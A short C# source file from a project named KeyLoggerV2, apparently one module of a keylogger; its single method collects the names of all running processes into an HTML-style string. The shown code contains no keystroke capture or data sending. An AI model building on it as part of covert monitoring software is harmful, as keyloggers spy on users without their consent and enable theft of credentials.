using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLoggerV2
{
    class RunningPro
    {
        private static TextBox texBody = new TextBox();

        public string GetProc()
        {
            try
            {
                Process[] allProcesses = Process.GetProcesses();

                foreach (Process process in allProcesses)
                {
                    texBody.Text += "<br>Process: " + process.ProcessName + "<br>";
                }
                return texBody.Text;
            }
            catch (Exception)
            {
                return "Not available";
            }
        }
    }
}
